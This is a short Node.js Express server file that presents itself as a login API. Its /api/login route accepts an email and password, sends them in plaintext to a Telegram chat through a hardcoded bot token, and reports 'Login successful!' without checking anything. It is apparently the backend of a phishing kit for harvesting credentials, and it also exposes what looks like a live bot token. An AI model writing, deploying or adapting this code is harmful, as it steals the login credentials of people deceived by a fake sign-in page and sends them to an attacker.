const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

// SIMPLE CORS - Allow everything (for testing)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// Home route
app.get('/', (req, res) => {
    res.json({ status: 'online', message: 'Server is running!' });
});

// Login route - SIMPLE VERSION
app.post('/api/login', async (req, res) => {
    console.log('📨 Login hit!');
    console.log('Body:', req.body);
    
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Email and password required' 
            });
        }

        // Send to Telegram
        const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
        const TELEGRAM_CHAT_ID = '7386607055';
        
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `🔐 New Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
            parse_mode: 'HTML'
        });

        res.json({ 
            success: true, 
            message: 'Login successful!' 
        });

    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Available: POST /api/login`);
});
